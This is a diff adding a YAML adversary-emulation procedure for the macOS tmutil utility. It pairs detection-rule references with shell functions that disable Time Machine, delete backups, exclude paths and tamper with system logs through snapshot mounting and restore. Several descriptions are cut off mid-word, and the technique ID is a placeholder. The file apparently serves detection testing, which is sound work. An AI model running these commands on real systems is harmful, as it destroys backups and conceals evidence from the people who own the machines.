@@ -1,0 +1,114 @@
+procedure_name: tmutil
+tactic: Impact
+ttp_id: T9999
+guid: $GUID
+intent: Manage Time Machine backups.
+author: '@darmado | https://x.com/darmad0'
+credit: 'LOOBins catalog author: Brendan Chamberlain (@infosecb)'
+created: '2023-05-01'
+updated: $UPDATED
+version: 1.0.0
+platform:
+- darwin
+detection:
+- ioc: 'Jamf Protect: Detect the deletion of localsnapshots'
+  analysis: https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/tmutil_activity
+- ioc: 'Sigma: Time Machine Backup Deletion Attempt Via Tmutil - MacOS'
+  analysis: https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_delete_backup.yml
+- ioc: 'Sigma: Time Machine Backup Disabled Via Tmutil - MacOS'
+  analysis: https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_disable_backup.yml
+- ioc: 'Sigma: New File Exclusion Added To Time Machine Via Tmutil - MacOS'
+  analysis: https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_tmutil_exclude_file_from_backup.yml
+resources:
+- link: https://www.loobins.io/
+  description: LOOBins — Living Off The Orchard macOS binaries
+- link: ''
+  description: ''
+- link: https://theevilbit.github.io/posts/cve_2020_9771/
+  description: mount_apfs TCC bypass and privilege escalation
+- link: https://github.molgen.mpg.de/pages/bs/macOSnotes/mac/mac_files_tmutil.html
+  description: Manage Time Machine backups
+- link: https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-0fd
+  description: 'Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - tmutil'
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --disable-time-machine
+    description: The following command disables Time Machine. An attacker can use this to prevent backups from occurr
+    execute_function:
+    - execute_disable_time_machine
+  - option: --delete-a-backup
+    description: The following command deletes the specified backup. An adversary may perform this action before laun
+    execute_function:
+    - execute_delete_backup
+  - option: --restore-a-backup
+    description: 'The following command restore the specified backup. An attacker can use this to restore a backup of '
+    execute_function:
+    - execute_restore_backup
+  - option: --tamper-with-system-logs
+    description: 'An adversary can use the snapshot and restore commands together to tamper with system logs. This is '
+    execute_function:
+    - execute_tamper_system_logs
+  - option: --exclude-path-from-backup
+    description: An adversary could exclude a path from Time Machine backups to prevent certain files from being back
+    execute_function:
+    - execute_exclude_path_from_backup
+  global_variable:
+  - name: CMD_TMUTIL
+    type: string
+    default_value: /usr/bin/tmutil
+  functions:
+  - name: execute_disable_time_machine
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_disable_time_machine() {\n    local result\n    result=$(tmutil disable 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\\
+      n\" \"$result\"\n    return 0\n}"
+  - name: execute_delete_backup
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_delete_backup() {\n    local result\n    result=$(tmutil delete /path/to/backup 2>&1)\n    $CMD_PRINTF\
+      \ \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
+  - name: execute_restore_backup
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_restore_backup() {\n    local result\n    result=$(tmutil restore /path/to/backup 2>&1)\n    $CMD_PRINTF\
+      \ \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
+  - name: execute_tamper_system_logs
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_tamper_system_logs() {\n    local result\n    result=$(mkdir /tmp/snapshot\ntmutil localsnapshot\ntmutil\
+      \ listlocalsnapshots /\nmount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data\
+      \ /tmp/snapshot\nopen /tmp/snapshot\nsudo vim /var/log/system.log\ntmutil restore com.apple.TimeMachine.2023-05-01-090000.local\
+      \ 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
+  - name: execute_exclude_path_from_backup
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_exclude_path_from_backup() {\n    local result\n    result=$(tmutil addexclusion /path/to/exclude 2>&1)\n\
+      \    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
